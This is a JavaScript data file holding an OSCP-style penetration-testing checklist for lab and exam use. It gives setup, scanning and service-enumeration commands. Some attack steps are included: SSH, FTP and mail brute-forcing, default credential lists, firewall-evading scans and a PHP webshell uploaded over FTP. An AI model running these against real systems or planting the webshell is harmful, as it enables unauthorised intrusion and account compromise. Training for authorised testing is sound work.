const CHECKLIST_DATA = [

  // ============================================================
  // PHASE 1 — PRE-ENGAGEMENT & SETUP
  // ============================================================
  {
    "id": "item-1",
    "phase": "1. Pre-Engagement & Setup",
    "step": "1.1 VPN & Connectivity",
    "title": "VPN connection verified",
    "feasible_when": "Always — must be completed before any target interaction.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Connect to VPN\nsudo openvpn <VPN_PROFILE>.ovpn\n\n# Verify tun0 is up\nip a show tun0\nifconfig tun0\n\n# Verify routing\nip route show\n\n# Confirm reachability\nping -c 3 <TARGET_IP>\ncurl ifconfig.me\n\n# Alternative: OpenConnect (Cisco/Palo Alto)\nsudo openconnect --protocol=gp <VPN_GATEWAY>"
      }
    ],
    "brief_description": "Connect to the lab/exam VPN and verify tun0 is up and routing correctly before touching any target."
  },
  {
    "id": "item-2",
    "phase": "1. Pre-Engagement & Setup",
    "step": "1.1 VPN & Connectivity",
    "title": "Set environment variables",
    "feasible_when": "Always — set immediately after tun0 is confirmed up.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Set attacker IP from tun0\nexport ATTACKER_IP=$(ip -4 addr show tun0 | grep -oP '(?<=inet )\\d+\\.\\d+\\.\\d+\\.\\d+')\n\n# Set target variables\nexport TARGET=<TARGET_IP>\nexport DOMAIN=<DOMAIN_NAME>          # e.g. corp.local\nexport DC_IP=<DC_IP>                 # Domain Controller IP\nexport DC_NAME=<DC_HOSTNAME>         # e.g. DC01\n\n# Confirm\necho \"Attacker: $ATTACKER_IP | Target: $TARGET | Domain: $DOMAIN\"\n\n# Add to /etc/hosts if domain is known\necho \"$TARGET $DOMAIN $DC_NAME.$DOMAIN\" | sudo tee -a /etc/hosts\n\n# Persist across sessions (~/.bashrc or ~/.zshrc)\necho \"export ATTACKER_IP=$ATTACKER_IP\" >> ~/.bashrc"
      }
    ],
    "brief_description": "Export $ATTACKER_IP, $TARGET, $DOMAIN, and $DC_IP so every command references them consistently."
  },
  {
    "id": "item-3",
    "phase": "1. Pre-Engagement & Setup",
    "step": "1.2 Workspace",
    "title": "Directory structure created per target",
    "feasible_when": "Always — create before starting enumeration on each target.",
    "snippets": [
      {
        "lang": "bash",
        "code": "export TARGET=<TARGET_IP>\nmkdir -p ~/oscp/$TARGET/{recon/{nmap,web,smb,ldap,snmp,ftp,dns,kerberos,rpc,sql,redis,misc},exploit/{bof,web,service},loot/{hashes,creds,keys,files},screenshots,report,transfer}\ncd ~/oscp/$TARGET\n\n# Create notes skeleton\ncat > notes.md << 'EOF'\n# Target: <TARGET_IP>\n## Open Ports\n## Services\n## Vulnerabilities\n## Exploitation Path\n## Credentials Found\n## Flags\n### local.txt:\n### proof.txt:\nEOF\n\necho \"Workspace ready: ~/oscp/$TARGET\""
      }
    ],
    "brief_description": "Organize per-target directories so all recon, exploits, loot and screenshots stay structured."
  },
  {
    "id": "item-4",
    "phase": "1. Pre-Engagement & Setup",
    "step": "1.2 Workspace",
    "title": "Terminal logging enabled",
    "feasible_when": "Always — enable at the very start of each session.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Option 1 — script (records everything in current terminal)\nscript -a ~/oscp/<TARGET_IP>/terminal_$(date +%F_%H%M).log\n\n# Option 2 — tmux with pane logging\ntmux new-session -s oscp\ntmux pipe-pane -o 'cat >> ~/oscp/<TARGET_IP>/tmux_$(date +%F).log'\n\n# Option 3 — tee all output\nexec > >(tee -a ~/oscp/<TARGET_IP>/session.log) 2>&1\n\n# Option 4 — PowerShell transcript (Windows attack host)\nStart-Transcript -Path C:\\oscp\\<TARGET_IP>\\log.txt -Append\n\n# Stop logging\nexit                          # exits script session\nStop-Transcript               # stops PS transcript"
      }
    ],
    "brief_description": "Log every terminal command from the start — you will need this for the report."
  },
  {
    "id": "item-5",
    "phase": "1. Pre-Engagement & Setup",
    "step": "1.2 Workspace",
    "title": "Note-taking environment ready",
    "feasible_when": "Always — open note-taking tool before any enumeration begins.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Recommended tools:\n# CherryTree    — best offline, colored nodes\n# Obsidian      — markdown-based, great search\n# Joplin        — encrypted, syncs well\n# Notion        — cloud, collaborative\n# Trilium       — self-hosted, hierarchical\n\n# Recommended per-machine structure:\n# [Machine: <TARGET_IP>]\n#   - Port Scan Results\n#   - Service Enumeration\n#   - Vulnerability Assessment\n#   - Exploitation Details\n#   - Privilege Escalation\n#   - Credentials & Hashes\n#   - Flags (local.txt / proof.txt)\n#   - Commands Used (copy-paste ready)\n\n# Quick markdown template\ncp ~/templates/machine_template.md ~/oscp/<TARGET_IP>/notes.md"
      }
    ],
    "brief_description": "Open notes before you start — document every finding immediately, don't rely on terminal history."
  },
  {
    "id": "item-6",
    "phase": "1. Pre-Engagement & Setup",
    "step": "1.2 Workspace",
    "title": "Screenshots tool ready and tested",
    "feasible_when": "Always — verify screenshot tool works before starting any target.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Linux options\nflameshot gui                                    # interactive selection\nscrot -s ~/oscp/<TARGET_IP>/screenshots/$(date +%H%M%S).png   # CLI selection\ngnome-screenshot -a                              # GNOME selection\n\n# Windows options\n# Win+Shift+S    — Snip & Sketch\n# ShareX         — best, auto-saves with timestamp\n# Greenshot      — lightweight, good annotations\n\n# Test it now\nflameshot gui &\n\n# Screenshot naming convention\n# <TARGET_IP>_initial_foothold.png\n# <TARGET_IP>_local_flag.png\n# <TARGET_IP>_privesc.png\n# <TARGET_IP>_proof_flag.png\n\n# Auto-screenshot directory\nexport SCRDIR=~/oscp/<TARGET_IP>/screenshots\nmkdir -p $SCRDIR\nalias ss='scrot -s $SCRDIR/$(date +%H%M%S).png'"
      }
    ],
    "brief_description": "Every proof flag needs a screenshot showing flag + id/whoami + hostname + ip in same frame."
  },
  {
    "id": "item-7",
    "phase": "1. Pre-Engagement & Setup",
    "step": "1.2 Workspace",
    "title": "Tool availability verified",
    "feasible_when": "Always — confirm tools are installed before starting.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Check critical tools\nfor tool in nmap rustscan masscan gobuster feroxbuster ffuf nikto smbclient crackmapexec impacket-secretsdump kerbrute bloodhound-python ligolo-ng chisel hydra hashcat john sqlmap; do\n  command -v $tool &>/dev/null && echo \"[+] $tool\" || echo \"[-] MISSING: $tool\"\ndone\n\n# Install missing (Kali)\nsudo apt update && sudo apt install -y nmap rustscan masscan gobuster feroxbuster ffuf nikto hydra hashcat john sqlmap crackmapexec bloodhound\n\n# Python impacket\npip3 install impacket --break-system-packages\n\n# Wordlists\nls /usr/share/seclists/ || sudo apt install -y seclists\nls /usr/share/wordlists/rockyou.txt || sudo gunzip /usr/share/wordlists/rockyou.txt.gz\n\n# linpeas / winpeas / chisel / ligolo pre-download\nmkdir ~/tools && cd ~/tools\nwget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh\nwget https://github.com/jpillora/chisel/releases/latest/download/chisel_1.9.1_linux_amd64.gz"
      }
    ],
    "brief_description": "Verify all tools exist before the exam — missing tools waste critical exam time."
  },
  {
    "id": "item-8",
    "phase": "1. Pre-Engagement & Setup",
    "step": "1.2 Workspace",
    "title": "Target scope documented",
    "feasible_when": "Always — document all in-scope IPs before starting.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# targets.txt format\ncat ~/oscp/targets.txt\n# 192.168.X.X   - hostname.domain.local - Windows 2019 - Status: TODO\n# 192.168.X.Y   - hostname.domain.local - Linux Ubuntu - Status: TODO\n# 10.10.10.X    - standalone            - Unknown      - Status: TODO\n\n# Generate nmap target file from CIDR\nnmap -sn <NETWORK_CIDR> -oG - | awk '/Up/{print $2}' > ~/oscp/live_hosts.txt\n\n# Exam scope tracking template\ncat > ~/oscp/scope.md << 'EOF'\n## Standalone Machines (25pts each)\n- [ ] <IP1> - local.txt: [] proof.txt: []\n- [ ] <IP2> - local.txt: [] proof.txt: []\n- [ ] <IP3> - local.txt: [] proof.txt: []\n\n## Active Directory Set (40pts)\n- [ ] <CLIENT_IP> - local.txt: [] proof.txt: []\n- [ ] <MS01_IP>   - local.txt: [] proof.txt: []\n- [ ] <DC_IP>     - local.txt: [] proof.txt: []\nEOF"
      }
    ],
    "brief_description": "Document all targets with status tracking — never accidentally attack out-of-scope hosts."
  },

  // ============================================================
  // PHASE 2 — RECONNAISSANCE & ENUMERATION
  // ============================================================
  {
    "id": "item-9",
    "phase": "2. Reconnaissance & Enumeration",
    "step": "2.1 Host Discovery",
    "title": "Ping sweep / host discovery",
    "feasible_when": "Always — run at the start of enumeration to identify live hosts.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# nmap ping sweep\nnmap -sn <NETWORK_CIDR> -oG recon/hosts.txt\ngrep Up recon/hosts.txt | awk '{print $2}' | tee recon/live_hosts.txt\n\n# fping (fast)\nfping -asgq <NETWORK_CIDR> 2>/dev/null | tee recon/fping.txt\n\n# masscan (fastest)\nmasscan -p 80,443,22,445 <NETWORK_CIDR> --rate=5000 -oL recon/masscan_discovery.txt\n\n# netdiscover (ARP — works on local subnet)\nnetdiscover -r <NETWORK_CIDR> -i tun0\n\n# arp-scan (same subnet only)\narp-scan <NETWORK_CIDR> -I eth0\n\n# ICMP sweep with specific TTL check\nfor ip in $(seq 1 254); do\n  (ping -c1 -W1 <NETWORK_PREFIX>.$ip &>/dev/null && echo \"<NETWORK_PREFIX>.$ip UP\") &\ndone; wait\n\n# Check if ICMP blocked — try TCP discovery instead\nnmap -PS22,80,443,445,3389 -PA80,443 -sn <NETWORK_CIDR> -oG recon/tcp_discovery.txt"
      }
    ],
    "brief_description": "Identify live hosts before scanning — always run TCP-based discovery as ICMP is often blocked."
  },
  {
    "id": "item-10",
    "phase": "2. Reconnaissance & Enumeration",
    "step": "2.2 Full Port Scan — TCP",
    "title": "Quick initial scan (common ports)",
    "feasible_when": "Always — run immediately after confirming host is alive.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# nmap — top 1000 ports with version + scripts + OS\nnmap -sC -sV -O -Pn -oA recon/nmap/initial <TARGET_IP>\n\n# rustscan → nmap (ultra-fast discovery then deep scan)\nrustscan -a <TARGET_IP> --ulimit 5000 -t 3000 -- -sC -sV -A -oA recon/nmap/rustscan\n\n# AutoRecon (comprehensive automation — recommended)\nautorecon <TARGET_IP> -o recon/ --single-target\nautorecon <TARGET_IP> --target-timeout 30m --output recon/\n\n# Nmap with all common scripts\nnmap -sC -sV -p- -Pn --open --min-rate 3000 -oA recon/nmap/initial_fast <TARGET_IP>\n\n# If firewall suspected — fragment packets\nnmap -sV -sC -f -Pn -oA recon/nmap/fragmented <TARGET_IP>\n\n# Decoy scan\nnmap -D RND:10 -sV -oA recon/nmap/decoy <TARGET_IP>"
      }
    ],
    "brief_description": "Quick scan first to get attack surface, then run full scan in the background immediately after."
  },
  {
    "id": "item-11",
    "phase": "2. Reconnaissance & Enumeration",
    "step": "2.2 Full Port Scan — TCP",
    "title": "Full TCP port scan (all 65535 ports)",
    "feasible_when": "Always — run in background alongside initial scan.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# nmap full — most thorough\nnmap -p- -sC -sV -Pn -oA recon/nmap/full <TARGET_IP>\n\n# Faster full scan\nnmap -p- --min-rate=5000 -Pn -T4 --open -oA recon/nmap/fast_full <TARGET_IP>\n\n# masscan → nmap workflow (fastest)\nmasscan -p1-65535 <TARGET_IP> --rate=10000 -oL recon/masscan.txt\nPORTS=$(grep open recon/masscan.txt | awk '{print $3}' | sort -u | tr '\\n' ',' | sed 's/,$//')\nnmap -p $PORTS -sC -sV -O -A -oA recon/nmap/masscan_followup <TARGET_IP>\n\n# rustscan full\nrustscan -a <TARGET_IP> -r 1-65535 --ulimit 5000 -- -sC -sV -A -oA recon/nmap/rust_full\n\n# naabu (go-based, fast)\nnaabu -host <TARGET_IP> -p- -rate 1000 -o recon/naabu.txt\nnmap -p $(cat recon/naabu.txt | tr '\\n' ',') -sV -sC -oA recon/nmap/naabu_followup <TARGET_IP>\n\n# Background scan\nnohup nmap -p- -Pn --min-rate=3000 -oA recon/nmap/bgfull <TARGET_IP> &\ntail -f recon/nmap/bgfull.nmap  # watch progress"
      }
    ],
    "brief_description": "Never skip the full 65535-port scan — non-standard ports hide critical services frequently."
  },
  {
    "id": "item-12",
    "phase": "2. Reconnaissance & Enumeration",
    "step": "2.2 Full Port Scan — TCP",
    "title": "Targeted version + script scan on discovered ports",
    "feasible_when": "Open ports have been identified from initial or full scan.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Deep version + scripts on specific ports\nnmap -p <PORT1>,<PORT2>,<PORT3> -sC -sV -A -oA recon/nmap/targeted <TARGET_IP>\n\n# All NSE vulnerability scripts\nnmap -p <PORTS> --script=vuln -oA recon/nmap/vuln <TARGET_IP>\n\n# HTTP-specific NSE\nnmap -p 80,443,8080,8443,8000,8888 --script='http-*' -oA recon/nmap/http <TARGET_IP>\n\n# Safe scripts only (no intrusion)\nnmap -p- --script=safe -oA recon/nmap/safe <TARGET_IP>\n\n# Aggressive with OS + traceroute\nnmap -A -oA recon/nmap/aggressive <TARGET_IP>\n\n# NSE discovery scripts\nnmap -p <PORTS> --script=discovery -oA recon/nmap/discovery <TARGET_IP>\n\n# Specific category\nnmap --script=\"default,auth,brute,discovery,exploit,vuln\" -p <PORTS> <TARGET_IP>\n\n# Parse nmap XML output\ncat recon/nmap/full.xml | grep -E 'portid|service name|product|version'\nxsltproc recon/nmap/full.xml -o recon/nmap/full.html  # HTML report"
      }
    ],
    "brief_description": "Deep NSE scripts on confirmed open ports — always run vuln category and service-specific scripts."
  },
  {
    "id": "item-13",
    "phase": "2. Reconnaissance & Enumeration",
    "step": "2.3 Full Port Scan — UDP",
    "title": "UDP port scan",
    "feasible_when": "Always — run after TCP scans; prioritize ports 53, 69, 111, 123, 137, 161, 500, 2049.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Top 50 UDP (fastest, usually enough)\nnmap -sU --top-ports 50 -Pn -oA recon/nmap/udp <TARGET_IP>\n\n# Targeted critical UDP services\nnmap -sU -p 53,67,68,69,111,123,137,138,139,161,162,500,514,623,1900,2049,4500,5353 -sV -oA recon/nmap/udp_targeted <TARGET_IP>\n\n# Top 100 with version detection\nnmap -sU --top-ports 100 -sV --version-intensity 5 -oA recon/nmap/udp100 <TARGET_IP>\n\n# unicornscan (faster UDP scanner)\nunicornscan -mU -p 1-65535 <TARGET_IP> 2>&1 | grep open | tee recon/unicornscan_udp.txt\n\n# SNMP quick check\nnmap -sU -p 161 --script=snmp-info,snmp-sysdescr <TARGET_IP>\n\n# NFS quick check\nnmap -sU -p 111,2049 --script=nfs-showmount <TARGET_IP>\n\n# DNS quick check\nnmap -sU -p 53 --script=dns-recursion,dns-service-discovery <TARGET_IP>"
      }
    ],
    "brief_description": "UDP is critical — SNMP (161), TFTP (69), NFS (2049), RPC (111) are common exam vectors."
  },
  {
    "id": "item-14",
    "phase": "2. Reconnaissance & Enumeration",
    "step": "2.4 OS & Service Fingerprinting",
    "title": "OS detection and service fingerprinting",
    "feasible_when": "Always — determine Linux vs Windows early to focus attack paths.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# nmap OS detection\nnmap -O --osscan-guess --osscan-limit <TARGET_IP>\nnmap -A -Pn <TARGET_IP>  # includes OS detection\n\n# TTL-based OS guess\nping -c 1 <TARGET_IP> | grep ttl\n# TTL 64   → Linux/Unix/macOS\n# TTL 128  → Windows\n# TTL 254  → Cisco/Solaris\n# TTL 255  → Linux (some distros) / Network devices\n\n# Banner grabbing\nnc -nv <TARGET_IP> 22        # SSH banner → OS hint\nnc -nv <TARGET_IP> 21        # FTP banner\nnc -nv <TARGET_IP> 25        # SMTP banner\nnc -nv <TARGET_IP> 80        # HTTP server header\n\n# curl header check\ncurl -sI http://<TARGET_IP> | grep -iE 'Server:|X-Powered-By:|X-AspNet|Set-Cookie:'\n\n# xprobe2\nxprobe2 <TARGET_IP>\n\n# p0f (passive fingerprinting)\np0f -i tun0 -r /tmp/capture.pcap\n\n# Check SMB version (hints at Windows version)\nnmap -p 445 --script=smb-os-discovery <TARGET_IP>\ncrackmapexec smb <TARGET_IP>"
      }
    ],
    "brief_description": "TTL and banner grabs give instant OS hints — Windows vs Linux changes every exploitation path."
  },

  // ============================================================
  // PHASE 3 — SERVICE-SPECIFIC ENUMERATION
  // ============================================================

  // --- DNS (53) ---
  {
    "id": "item-15",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.1 DNS (53)",
    "title": "Zone transfer & comprehensive DNS enumeration",
    "feasible_when": "port 53 (TCP/UDP) is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Zone transfer attempt (most important)\ndig axfr @<TARGET_IP> <DOMAIN>\nhost -l <DOMAIN> <TARGET_IP>\n\n# dnsrecon — comprehensive\ndnsrecon -d <DOMAIN> -n <TARGET_IP> -t axfr\ndnsrecon -d <DOMAIN> -n <TARGET_IP> -t std,rvl,brt,axfr,mx,srv,ns\ndnsrecon -d <DOMAIN> -n <TARGET_IP> -D /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t brt\n\n# dnsenum\ndnsenum --dnsserver <TARGET_IP> --enum -p 0 -s 0 -o recon/dns/dnsenum.xml <DOMAIN>\n\n# fierce\nfierce --domain <DOMAIN> --dns-servers <TARGET_IP>\n\n# Manual DNS queries\ndig @<TARGET_IP> <DOMAIN> ANY\ndig @<TARGET_IP> <DOMAIN> MX\ndig @<TARGET_IP> <DOMAIN> NS\ndig @<TARGET_IP> <DOMAIN> TXT\ndig @<TARGET_IP> <DOMAIN> SOA\ndig @<TARGET_IP> <DOMAIN> AAAA\n\n# Reverse lookup sweep\nnmap -sL <NETWORK_CIDR> | grep -v 'Nmap scan'\nfor ip in $(seq 1 254); do\n  result=$(dig +short -x <NETWORK_PREFIX>.$ip @<TARGET_IP>)\n  [ -n \"$result\" ] && echo \"<NETWORK_PREFIX>.$ip → $result\"\ndone\n\n# Add discovered names to /etc/hosts\necho \"<TARGET_IP> <HOSTNAME>.<DOMAIN> <HOSTNAME>\" | sudo tee -a /etc/hosts"
      }
    ],
    "brief_description": "Zone transfer dumps all DNS records at once — always attempt before brute-force. Check ALL record types."
  },
  {
    "id": "item-16",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.1 DNS (53)",
    "title": "Subdomain brute-force",
    "feasible_when": "port 53 is open or a web application with a domain is present.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# gobuster DNS\ngobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -r <TARGET_IP>:53 -t 50 -o recon/dns/gobuster_dns.txt\ngobuster dns -d <DOMAIN> -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -r <TARGET_IP>:53 -t 100\n\n# ffuf vhost subdomain\nffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<TARGET_IP> -H 'Host: FUZZ.<DOMAIN>' -fs <DEFAULT_SIZE> -o recon/dns/ffuf_subdomain.json\n\n# amass\namass enum -d <DOMAIN> -r <TARGET_IP> -o recon/dns/amass.txt\namass enum -passive -d <DOMAIN>  # passive OSINT\n\n# massdns\ncat /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt | sed 's/$/<DOMAIN>/' > /tmp/dns_targets.txt\nmassdns -r /usr/share/seclists/Miscellaneous/dns-resolvers.txt -t A /tmp/dns_targets.txt -o S -w recon/dns/massdns.txt\n\n# puredns\npuredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <DOMAIN>\n\n# Add found subdomains to /etc/hosts\necho '<TARGET_IP> <SUBDOMAIN>.<DOMAIN>' | sudo tee -a /etc/hosts"
      }
    ],
    "brief_description": "Brute-force subdomains that may host separate services or admin panels not visible from main domain."
  },

  // --- FTP (21) ---
  {
    "id": "item-17",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.2 FTP (21)",
    "title": "Anonymous login & FTP enumeration",
    "feasible_when": "port 21 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Anonymous login\nftp <TARGET_IP>\n# Username: anonymous  Password: (blank) or anonymous@domain.com\n\n# nmap scripts\nnmap -p 21 --script='ftp-anon,ftp-bounce,ftp-brute,ftp-syst,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,ftp-libopie' <TARGET_IP>\n\n# Verify anonymous access\ncurl -s ftp://anonymous:anonymous@<TARGET_IP>/ --list-only\nwget --mirror ftp://anonymous:anonymous@<TARGET_IP>/ -P recon/ftp/\n\n# Authenticated access\ncurl -u '<USER>:<PASS>' ftp://<TARGET_IP>/ --list-only\nwget -m ftp://<USER>:<PASS>@<TARGET_IP>/ -P recon/ftp/\n\n# Brute-force FTP\nhydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP> -t 4 -V\nmedusa -h <TARGET_IP> -U users.txt -P passwords.txt -M ftp\nncrack -p 21 --user admin -P /usr/share/wordlists/rockyou.txt <TARGET_IP>\n\n# Check FTP for vsFTPd 2.3.4 backdoor (CVE-2011-2523)\nnmap -p 21 --script=ftp-vsftpd-backdoor <TARGET_IP>"
      }
    ],
    "brief_description": "Always test anonymous FTP — common source of credentials, config files, and write access to webroot."
  },
  {
    "id": "item-18",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.2 FTP (21)",
    "title": "FTP file interaction & exploitation",
    "feasible_when": "port 21 is open and credentials (including anonymous) are confirmed.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Recursive download\nwget -m --no-passive ftp://<USER>:<PASS>@<TARGET_IP>/\ncurl -u '<USER>:<PASS>' --list-only -r ftp://<TARGET_IP>/\n\n# FTP commands\nftp <TARGET_IP>\n  binary         # switch to binary mode for executables\n  get <FILE>     # download file\n  mget *         # download all\n  put shell.php  # upload (if write access)\n  ls -la\n  pwd\n  cd /\n  passive        # toggle passive mode\n\n# Upload webshell if FTP → webroot\necho '<?php system($_GET[\"cmd\"]); ?>' > /tmp/cmd.php\ncurl -u '<USER>:<PASS>' -T /tmp/cmd.php ftp://<TARGET_IP>/\n\n# FTP bounce scan (port 21 open)\nnmap -b anonymous@<TARGET_IP> -Pn <INTERNAL_IP>\n\n# Check for writable dirs\nftp <TARGET_IP>\n  cd /var/www/html\n  put test.txt\n  ls test.txt"
      }
    ],
    "brief_description": "Download everything offline — check for configs, scripts, SSH keys. Upload shells if FTP maps to webroot."
  },

  // --- SSH (22) ---
  {
    "id": "item-19",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.3 SSH (22)",
    "title": "SSH banner & version enumeration",
    "feasible_when": "port 22 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Banner grab\nnc -nv <TARGET_IP> 22\nssh -v <TARGET_IP> 2>&1 | head -30\n\n# nmap SSH scripts\nnmap -p 22 --script='ssh-auth-methods,ssh2-enum-algos,ssh-hostkey,sshv1,ssh-brute' <TARGET_IP>\n\n# Check supported auth methods for specific user\nssh -v -o PreferredAuthentications=none <USER>@<TARGET_IP> 2>&1 | grep 'authentications that can continue'\n\n# SSH audit — comprehensive\nssh-audit <TARGET_IP>\nssh-audit <TARGET_IP>:22 > recon/ssh_audit.txt\n\n# Check for known vulnerable versions\n# OpenSSH < 7.7 → CVE-2018-15473 user enumeration\n# OpenSSH 2.3-7.7 → timing oracle user enum\n# Dropbear < 2019.78 → multiple CVEs\n\n# User enumeration (CVE-2018-15473)\npython3 ssh_user_enum.py --username-list users.txt --hostname <TARGET_IP>\nnmap -p 22 --script=ssh-auth-methods --script-args='ssh.user=root' <TARGET_IP>\n\n# Enumerate host keys\nssh-keyscan -t rsa,ecdsa,ed25519 <TARGET_IP>"
      }
    ],
    "brief_description": "SSH version determines exploitation path — old OpenSSH versions allow stealthy user enumeration."
  },
  {
    "id": "item-20",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.3 SSH (22)",
    "title": "SSH brute-force & key attacks",
    "feasible_when": "port 22 is open and valid usernames exist; confirm no lockout policy first.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Hydra (most common)\nhydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4 -V -o recon/hydra_ssh.txt\nhydra -l <USER> -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP> -t 4\n\n# CrackMapExec\ncrackmapexec ssh <TARGET_IP> -u users.txt -p passwords.txt\n\n# Medusa\nmedusa -h <TARGET_IP> -U users.txt -P passwords.txt -M ssh\n\n# Patator\npatator ssh_login host=<TARGET_IP> user=FILE0 password=FILE1 0=users.txt 1=passwords.txt\n\n# SSH key login attempts\nssh -i id_rsa <USER>@<TARGET_IP>\nssh -i id_rsa -o StrictHostKeyChecking=no <USER>@<TARGET_IP>\n\n# Crack SSH passphrase from key\nssh2john id_rsa > id_rsa.hash\njohn --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash\nhashcat -m 22931 id_rsa.hash /usr/share/wordlists/rockyou.txt  # new format\nhashcat -m 22921 id_rsa.hash /usr/share/wordlists/rockyou.txt  # old format\n\n# Weak RSA key check\nssh-audit <TARGET_IP>  # shows weak ciphers and key issues\n\n# Default creds to try\n# admin:admin, root:root, root:toor, ubuntu:ubuntu, pi:raspberry, vagrant:vagrant"
      }
    ],
    "brief_description": "Brute-force SSH only after confirming no lockout — spray common passwords before full brute-force."
  },

  // --- SMTP (25/465/587) ---
  {
    "id": "item-21",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.4 SMTP (25/465/587)",
    "title": "SMTP user enumeration & banner",
    "feasible_when": "port 25, 465, or 587 is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# Banner grab\nnc -nv <TARGET_IP> 25\nopenssl s_client -starttls smtp -connect <TARGET_IP>:587\nopenssl s_client -connect <TARGET_IP>:465  # SMTPS\n\n# nmap scripts\nnmap -p 25,465,587 --script='smtp-commands,smtp-enum-users,smtp-ntlm-info,smtp-open-relay,smtp-vuln*' <TARGET_IP>\n\n# smtp-user-enum tool\nsmtp-user-enum -M VRFY -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>\nsmtp-user-enum -M EXPN -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP>\nsmtp-user-enum -M RCPT -U /usr/share/seclists/Usernames/Names/names.txt -t <TARGET_IP> -D <DOMAIN>\n\n# Manual enumeration\ntelnet <TARGET_IP> 25\n  EHLO attacker.local\n  VRFY root\n  VRFY admin\n  VRFY <USERNAME>\n  EXPN helpdesk\n  RCPT TO:<root>\n  QUIT\n\n# Check for open relay\nswaks --from attacker@evil.com --to victim@target.com --server <TARGET_IP>\n\n# NTLM auth info leak\ncurl smtp://<TARGET_IP> --user ':' --sasl-authzid '' -v 2>&1 | grep -i ntlm"
      }
    ],
    "brief_description": "SMTP VRFY/EXPN enumerates valid usernames without credentials — always try all three methods."
  },

  // --- POP3/IMAP ---
  {
    "id": "item-22",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.5 POP3/IMAP (110/143/993/995)",
    "title": "POP3 and IMAP enumeration",
    "feasible_when": "port 110 (POP3), 143 (IMAP), 993 (IMAPS), or 995 (POP3S) is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# POP3 manual\nnc -nv <TARGET_IP> 110\n  USER <USERNAME>\n  PASS <PASSWORD>\n  LIST          # list emails\n  RETR 1        # read email 1\n  QUIT\n\n# POP3S\nopenssl s_client -connect <TARGET_IP>:995\n\n# IMAP manual\nnc -nv <TARGET_IP> 143\n  a1 LOGIN <USER> <PASS>\n  a2 LIST \"\" \"*\"\n  a3 SELECT INBOX\n  a4 FETCH 1 BODY[]\n  a5 LOGOUT\n\n# IMAPS\nopenssl s_client -connect <TARGET_IP>:993\n\n# nmap scripts\nnmap -p 110,143,993,995 --script='pop3-capabilities,imap-capabilities,pop3-ntlm-info,imap-ntlm-info,imap-brute,pop3-brute' <TARGET_IP>\n\n# Brute-force\nhydra -L users.txt -P passwords.txt imap://<TARGET_IP>\nhydra -L users.txt -P passwords.txt pop3://<TARGET_IP>\n\n# Check with curl\ncurl -u '<USER>:<PASS>' imap://<TARGET_IP>/INBOX\ncurl -u '<USER>:<PASS>' pop3://<TARGET_IP>/"
      }
    ],
    "brief_description": "Email services may contain credentials, internal docs, and password reset links in stored messages."
  },

  // --- HTTP/HTTPS ---
  {
    "id": "item-23",
    "phase": "3. Service-Specific Enumeration",
    "step": "3.6 HTTP/HTTPS (80/443/8080/8443/8000/8888)",
    "title": "Technology identification & fingerprinting",
    "feasible_when": "Any HTTP/HTTPS port is open.",
    "snippets": [
      {
        "lang": "bash",
        "code": "# whatweb — stack fingerprinting\nwhatweb http://<TARGET_IP> -v\nwhatweb http://<TARGET_IP>:8080 -v --log-verbose=recon/web/whatweb.txt\n\n# curl headers\ncurl -sIL http://<TARGET_IP> | grep -iE 'server:|x-powered-by:|set-cookie:|x-aspnet|x-generator|cf-ray'\n\n# nikto — vuln scan\nnikto -h http://<TARGET_IP> -output recon/web/nikto.txt -Format txt\nnikto -h http://<TARGET_IP>:8080 -Tuning 13457 -output recon/web/nikto_8080.txt\n\n# wafw00f — WAF detection\nwafw00f http://<TARGET_IP>\nnmap -p 80,443 --script=http-waf-detect,http-waf-fingerprint <TARGET_IP>\n\n# SSL/TLS analysis\nopenssl s_client -connect <TARGET_IP>:443 < /dev/null 2>/dev/null | openssl x509 -noout -text | grep -E 'Subject:|DNS:|Issuer:'\ntestssl.sh <TARGET_IP>:443   # comprehensive TLS check\nnmap --script=ssl-enum-ciphers -p 443 <TARGET_IP>\n\n# Source review\ncurl -skL http://<TARGET_IP> | html2text | head -100\ncurl -skL http://<TARGET_IP> | grep -iE 'href|src|action|comment' | grep -v '#'\n\n# Check all 